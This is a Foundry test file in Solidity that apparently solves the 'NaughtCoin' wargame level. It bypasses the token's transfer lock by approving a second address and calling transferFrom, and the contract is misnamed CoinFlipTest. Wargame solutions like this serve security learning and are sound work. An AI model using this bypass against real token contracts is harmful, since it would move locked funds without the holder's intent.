// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test, console} from "forge-std/Test.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";

contract CoinFlipTest is Test {
    NaughtCoin public nc;

    address alice = address(1);

    function setUp() public {
        vm.prank(alice);
        nc = new NaughtCoin(alice);
    }

    function testAttack() public {
        assertEq(nc.balanceOf(alice), 1000000 ether);

        vm.prank(alice);
        nc.approve(address(this), 1000000 ether);

        nc.transferFrom(alice, address(this), 1000000 ether);

        assertEq(nc.balanceOf(alice), 0);
        assertEq(nc.balanceOf(address(this)), 1000000 ether);
    }
}
